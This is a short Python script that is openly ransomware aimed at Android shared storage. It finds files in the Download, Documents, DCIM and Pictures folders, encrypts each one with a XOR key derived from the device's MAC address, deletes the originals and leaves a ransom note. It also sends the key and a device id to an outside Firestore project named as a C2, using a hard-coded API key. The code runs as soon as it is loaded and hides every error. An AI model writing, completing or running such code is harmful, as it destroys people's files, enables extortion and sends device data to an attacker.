import os, time, json, hashlib, uuid, urllib.request

PROJECT_ID = "jack-c2-b55bb"
API_KEY = "AIzaSyBuw3qWiY8VXffwyJH422ocsNZuiDTyKXI"
DID = hashlib.md5((os.uname().nodename + str(uuid.getnode())).encode()).hexdigest()[:16]
KEY = hashlib.sha256((str(uuid.getnode()) + "PYPJACK").encode()).hexdigest()
EXT = ".locked"
MAX_SIZE = 20 * 1024 * 1024

TARGETS = [
    "/sdcard/Download",
    "/sdcard/Documents",
    "/sdcard/DCIM",
    "/sdcard/Pictures"
]


def _url(path):
    return "https://firestore.googleapis.com/v1/projects/" + PROJECT_ID + "/databases/(default)/documents/" + path + "?key=" + API_KEY


def _set(path, data):
    try:
        fields = {}
        for k, v in data.items():
            if isinstance(v, int) and not isinstance(v, bool):
                fields[k] = {"integerValue": str(v)}
            else:
                fields[k] = {"stringValue": str(v)}
        body = json.dumps({"fields": fields}).encode()
        req = urllib.request.Request(_url(path), data=body, method="PATCH", headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=15) as r:
            r.read()
        return True
    except Exception:
        return False


def _enc(path):
    try:
        if path.endswith(EXT):
            return
        size = os.path.getsize(path)
        if size > MAX_SIZE:
            return
        with open(path, "rb") as f:
            data = f.read()
        kb = KEY.encode()
        enc = bytes(b ^ kb[i % len(kb)] for i, b in enumerate(data))
        with open(path + EXT, "wb") as f:
            f.write(enc)
        os.remove(path)
    except Exception:
        pass


def _note(d):
    try:
        p = os.path.join(d, "READ_ME.txt")
        with open(p, "w", encoding="utf-8") as f:
            f.write("your files are encrypted.\nkey id: " + KEY[:16] + "\n")
    except Exception:
        pass


def _run():
    try:
        _set("devices/" + DID + "/ransom/status", {"key": KEY, "ts": int(time.time())})
        for tgt in TARGETS:
            if not os.path.isdir(tgt):
                continue
            _note(tgt)
            for root, dirs, files in os.walk(tgt):
                for fn in files:
                    if fn == "READ_ME.txt":
                        continue
                    _enc(os.path.join(root, fn))
    except Exception:
        pass


try:
    _run()
except Exception:
    pass